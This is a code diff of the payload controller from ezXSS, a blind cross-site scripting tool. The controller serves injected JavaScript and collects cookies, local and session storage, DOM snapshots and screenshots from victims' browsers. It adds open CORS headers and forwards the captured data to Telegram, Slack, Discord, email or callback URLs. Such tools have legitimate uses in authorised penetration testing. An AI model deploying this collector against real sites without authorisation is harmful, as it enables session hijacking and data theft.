@@ -2,11 +2,28 @@
 
 class Payloads extends Controller
 {
-
+    /**
+     * Summary of rows
+     * 
+     * @var array
+     */
     private $rows = ['uri', 'ip', 'referer', 'user-agent', 'cookies', 'localstorage', 'sessionstorage', 'dom', 'origin'];
 
     /**
-     * Catch all default payload
+     * Add default headers to constructor
+     */
+    public function __construct()
+    {
+        parent::__construct();
+        
+        // Add CORS headers
+        header('Access-Control-Allow-Origin: *');
+        header('Access-Control-Allow-Headers: origin, x-requested-with, content-type');
+        header('Access-Control-Allow-Methods: GET, POST');
+    }
+
+    /**
+     * Renders the default payload and returns the content.
      *
      * @return string
      */
@@ -15,41 +32,37 @@ class Payloads extends Controller
         $this->view->renderPayload('index');
         $this->view->setContentType('application/x-javascript');
 
-        $payloadUrl = "//{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
-        $payload = $this->getPayloadByUrl($payloadUrl);
+        // Get the payload data for the current URL
+        $payload = $this->getPayloadByUrl(url);
 
-        $noCollect = '';
-        foreach($this->rows as $row) {
-            if($payload["collect_{$row}"] === 0) {
-                $noCollect .= "'{$row}',";
+        // Create the string of rows we dont collect
+        $noCollect = [];
+        foreach ($this->rows as $row) {
+            if ($payload["collect_{$row}"] === 0) {
+                $noCollect[] = "'$row'";
             }
         }
 
-        $pages = '';
-        foreach(explode('~', $payload['pages']) as $page) {
-            if(empty($page)) {
-                continue;
-            }
-            $pages .= "'".e($page)."',";
-        }
+        // Create the string of pages we collect
+        $pages = array_map(function ($page) {
+            return "'" . e($page) . "'";
+        }, array_filter(explode('~', $payload['pages'])));
 
-        $this->view->renderData('noCollect', rtrim($noCollect, ','), true);
-        $this->view->renderData('pages', rtrim($pages, ','), true);
+        $screenshot = $payload['collect_screenshot'] ? $this->view->getPayload('screenshot') : '';
+
+        $this->view->renderData('noCollect', implode(',', $noCollect), true);
+        $this->view->renderData('pages', implode(',', $pages), true);
         $this->view->renderData('customjs', $payload['customjs'], true);
-
-        if($payload['collect_screenshot']) {
-            $this->view->renderData('screenshot', $this->view->getPayload('screenshot'), true);
-        } else {
-            $this->view->renderData('screenshot', '');
-        }
-        $this->view->renderData('payload', $payloadUrl);
+        $this->view->renderData('screenshot', $screenshot, true);
+        $this->view->renderData('payload', url);
 
         return $this->view->getContent();
     }
 
     /**
-     * Custom payloads
+     * Renders custom payload and returns the content.
      *
+     * @param string $name Payload name
      * @return string
      */
     public function custom($name)
@@ -59,12 +72,13 @@ class Payloads extends Controller
             $this->view->setContentType('application/x-javascript');
             return $this->view->getContent();
         } catch (Exception $e) {
+            // On any type of error, fallback to default
             return $this->index();
         }
     }
 
     /**
-     * Callback function
+     * Callback function that receives all incoming data
      *
      * @return string
      */
@@ -146,13 +160,17 @@ class Payloads extends Controller
 
             // Create a image from the screenshot data
             if (!empty($data->screenshot)) {
-                $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot));
-                $data->screenshotName = time() . md5(
-                    $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
-                ) . bin2hex(openssl_random_pseudo_bytes(5));
-                $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotName}.png", 'w');
-                fwrite($saveImage, $screenshot);
-                fclose($saveImage);
+                try {
+                    $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot));
+                    $data->screenshotName = time() . md5(
+                        $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
+                    ) . bin2hex(openssl_random_pseudo_bytes(5));
+                    $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotName}.png", 'w');
+                    fwrite($saveImage, $screenshot);
+                    fclose($saveImage);
+                } catch (Exception $e) {
+                    $data->screenshotName = '';
+                }
             }
 
             // Save the report
@@ -171,7 +189,7 @@ class Payloads extends Controller
                 json_encode($data->sessionstorage),
                 $data->payload
             );
-            $data->domain = e($_SERVER['HTTP_HOST']);
+            $data->domain = host;
             $data->time = time();
             $data->timestamp = date("c", strtotime("now"));
 
@@ -187,6 +205,12 @@ class Payloads extends Controller
         return 'github.com/ssl/ezXSS';
     }
 
+    /**
+     * Send an alert message
+     *
+     * @param object $data The data to be displayed in the alert message
+     * @return void
+     */
     private function alert($data)
     {
         // Callback alerting
@@ -267,6 +291,12 @@ class Payloads extends Controller
         }
     }
 
+    /**
+     * Sends out alert to custom callback url
+     * 
+     * @param object $data The data to be displayed in the alert message
+     * @return void
+     */
     private function callbackAlert($data)
     {
         // Send alert to custom callback url
@@ -282,6 +312,14 @@ class Payloads extends Controller
         curl_exec($ch);
     }
 
+    /**
+     * Sends out alert to telegram bot
+     * 
+     * @param object $data The data to be displayed in the alert message
+     * @param string $bottoken Telegram bot token
+     * @param string $chatid Telegram chat id
+     * @return void
+     */
     private function telegramAlert($data, $bottoken, $chatid)
     {
         if (!empty($data->screenshot)) {
@@ -301,6 +339,13 @@ class Payloads extends Controller
         curl_exec($ch);
     }
 
+    /**
+     * Sends out alert to mail
+     * 
+     * @param object $data The data to be displayed in the alert message
+     * @param string $email The email to send to
+     * @return void
+     */
     private function mailAlert($data, $email)
     {
         if (!empty($data->screenshot)) {
@@ -322,6 +367,13 @@ class Payloads extends Controller
         );
     }
 
+    /**
+     * Sends out alert to Slack
+     * 
+     * @param object $data The data to be displayed in the alert message
+     * @param string $webhookURL The webook url
+     * @return void
+     */
     private function slackAlert($data, $webhookURL)
     {
         // Create Slack alert template
@@ -339,10 +391,17 @@ class Payloads extends Controller
         curl_exec($ch);
     }
 
+    /**
+     * Sends out alert to Discord
+     * 
+     * @param object $data The data to be displayed in the alert message
+     * @param string $webhookURL The webook url
+     * @return void
+     */
     private function discordAlert($data, $webhookURL)
     {
         if (!empty($data->screenshot)) {
-            $data->screenshot = 'https://' . e($_SERVER['HTTP_HOST']) . "/assets/img/report-{$data->screenshotName}.png";
+            $data->screenshot = "https://{$data->domain}/assets/img/report-{$data->screenshotName}.png";
         }
 
         // Create Discord alert template
@@ -362,6 +421,12 @@ class Payloads extends Controller
         curl_exec($ch);
     }
 
+    /**
+     * Returns the payload array by url
+     * 
+     * @param string $payloadUrl The current payload url
+     * @return array
+     */
     private function getPayloadByUrl($payloadUrl)
     {
         // Split the URL into segments
